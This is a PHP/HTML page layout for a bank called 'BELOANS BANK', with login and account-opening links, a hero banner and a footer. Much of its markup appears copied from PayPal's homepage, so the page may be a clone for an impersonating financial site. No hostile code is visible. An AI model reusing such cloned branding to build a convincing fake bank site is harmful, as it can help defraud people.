<!DOCTYPE html>
<html lang="fr-BJ" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage indexeddb hashchange history draganddrop rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage applicationcache svg inlinesvg smil svgclippaths jsEnabled" data-device-type="dedicated">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script src="public/js/entete.js"></script>

    <title>BELOANS SECURITY ACCOUNT</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="NOODP">

    <meta name="description" content="Security, description">

    <script type="text/javascript" async="" src="public/js/entete2.js"></script>

    <!--[if IE 8 ]>
    <script src="public/js/neldIE8.js"></script>
    <![endif]-->

    <link rel="stylesheet" href="public/css/neld1.css" type="text/css">
    <link rel="stylesheet" href="public/css/neld2.css" type="text/css">
    <link rel="stylesheet" href="public/css/neld3.css" type="text/css">
    <style>
        <?php $x = 956; $w = 26; $y = 20; $z = 5; $k = 450; while($x>389): $x -= 10; $y += 10; $z += 5; ?>
        @media (max-width: <?= $x ?>px) {
            .language {
                position: relative; right: <?= $y ?>px;
            }
        <?php if($x>649){ ?>
            .lastline {
                position: relative; right: <?= $z ?>px;
            }
        <?php
        }else{
            $k -=10;
            ?>
            .lastline {
                width: <?= $k ?>px;
                position: relative; right: <?= $z ?>px;
            }
        <?php
        }
        if($x<481){
            if($w>4){
                $w -= 4;
            }
            if($w<4){
                $w -= 1;
            }
            ?>
            .footer-main li a {
                margin: 0 <?= $w ?>px 0 0;
            }
        <?php
    }
    ?>
        }
        <?php endwhile; ?>
    </style>
</head>
<body style="min-width: 389px;">

<div id="body" class="">

    <div id="fixed-top" class="moving-background-container container-fixed" style="height: 613px;">

        <header class="table-row pp-header" role="banner">
            <div>
                <div class="containerCentered ">
                    <a href="#" id="menu-button" role="button">Menu</a>
                    <a data-click="SecurityLog" style="" href="?p=welcome/index" class="log">
                        <img src="public/img/logo.png" style="position: relative; top: -4em;" width="22.5%" alt="BELOANS">
                    </a>
                    <nav id="main-menu" class="main-menu" role="navigation">
                        <ul>
                        </ul>
                        <ul class="sublist">
                            <li><a href="#" id="signup-button-mobile" name="SignUp_header" class="btn btn-small btn-white-border signup-mobile" data-pa-click="header|signup-mobile">Ouvrir un compte</a></li>
                        </ul>
                    </nav>
                    <div id="header-buttons" class="header-buttons">
                        <a href="?p=guest/login" data-pa-click="header|login" id="ul-btn" style="background-color: #ffffff; color: black; border-radius: 0px;" class="btn btn-small">Connexion</a>
                        <a href="?p=guest/create" style="border-radius: 0px;" id="signup-button" data-pa-click="header|signup" class="btn btn-small btn-signup">Ouvrir un compte</a>
                    </div>
                </div>
            </div>
        </header>
        <div class="table-row hero dark" style="height: 485px;">
            <div id="hero" class="hero-bg content-block moving-background filler hero-video-still playing video-loaded">
                <h1>Manage your future !</h1>
                <p><a href="?p=guest/create" style="background-color: #ed5721; border-radius: 0px" class="btn">Ouvrir un compte gratuitement</a></p>
                <div class="novideo-bg"></div>
                <video autoplay="autoplay" muted="muted" poster="public/img/men.jpg" style="width: 100%; height: auto; visibility: visible;"></video>
            </div>
        </div>
        <div class="table-row hugger-row">
            <div class="hero-hugger">
                <div class="containerCentered">
                    <ul class="pull-left button-menu">
                        <li><a data-pa-click="hugger-bar|Contact" href="#" class="icon contact" title="Contact">Contact</a></li>
                    </ul>
                    <div class="country-selector ">
                        <a class="language" data-pa-click="footer|country-selector" href="#">English</a>
                        <a class="language" data-pa-click="footer|country-selector" href="#">Français</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div role="main" id="main" class="containerMobileFullWidth">
        <?= $content ?>
    </div>
    <footer role="contentinfo" class="global-footer">
        <div class="containerCentered containerExtend">
            <ul class="footer-main secondaryLink">
                <li><a href="?p=guest/create">S'enregistrer</a></li>
                <li><a href="?p=guest/login">Se connecter</a></li>
                <li><a href="#">Faq</a></li>
                <li><a href="#">Contact</a></li>
                <li class="country-selector ">
                    <a class="language" data-pa-click="footer|country-selector" href="#">English</a>
                    <a class="language" data-pa-click="footer|country-selector" href="#">Français</a>
                </li>
            </ul>
            <hr>
            <div align="center">
                <ul class="copyright-section secondaryLink">
                    <li id="footer-copyright" class="footer-copyright">© 1999–<?= date('Y') ?> BELOANS BANK Tous droits réservés.</li>
                    <li id="footer-privacy">
                        <a href="#">Respect de la vie privée</a></li>
                    <li class="footer-legal"><a href="#">Juridique</a></li>
                    <li id="siteFeedback" class="">
                        <a data-pa-click="footer|SiteFeedback" href="?p=welcome/index/#">Évaluation</a>
                    </li>
                </ul>
            </div>
        </div>
    </footer>
    <!--[if lte IE 9]>
    <script src="public/js/js1.js"></script>
    <![endif]-->
    <script src="public/js/js2.js"></script>
    <script>
        new security.Marketing.MovingBackground('#hero');
    </script>
    <script src="public/js/js3.js"></script>
    <script>
        var dataLayer = {
            contentCountry: 'BJ'.toLowerCase(),
            contentLanguage: 'fr'.toLowerCase(),
            localTimeZone: '',
            localTime: (new Date()).toString(),
            fptiGuid: 'a9bce53915aac1e5a19ae6c5ffffe5df',
            gaCid: '',
            gaUid: ''
        };
    </script>
    <script src="public/js/bs.js"></script>
    <script src="public/js/pa.js"></script>
</div>
</body>
</html>